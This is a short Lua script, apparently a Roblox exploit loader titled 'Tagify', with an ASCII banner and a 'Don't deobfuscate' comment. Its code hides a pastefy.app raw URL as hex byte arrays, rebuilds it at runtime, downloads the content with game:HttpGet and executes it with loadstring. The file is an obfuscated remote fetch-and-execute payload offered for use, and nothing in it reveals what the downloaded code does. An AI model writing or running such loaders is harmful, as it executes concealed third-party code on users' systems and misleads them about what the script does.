--[[

___________              .__  _____       
\__    ___/____     ____ |__|/ ____\__.__ 
  |    |  \__  \   / ___\|  \   __<   |  |
  |    |   / __ \_/ /_/  >  ||  |  \___  |
  |____|  (____  /\___  /|__||__|  / ____|
               \//_____/           \/     
               
               @A_Raidi | sobre2is
               Don't deobfuscate
              
]]

local _ = string
local a = {0x68,0x74,0x74,0x70,0x73,0x3a,0x2f,0x2f}
local b = {0x70,0x61,0x73,0x74,0x65,0x66,0x79,0x2e,0x61,0x70,0x70}
local c = {0x2f,0x38,0x78,0x39,0x78,0x57,0x72,0x6a,0x4a}
local d = {0x2f,0x72,0x61,0x77}

local function x(t)
    local s = ""
    for i = 1, #t do
        s = s .. _.char(t[i])
    end
    return s
end

loadstring(game:HttpGet(x(a) .. x(b) .. x(c) .. x(d)))()
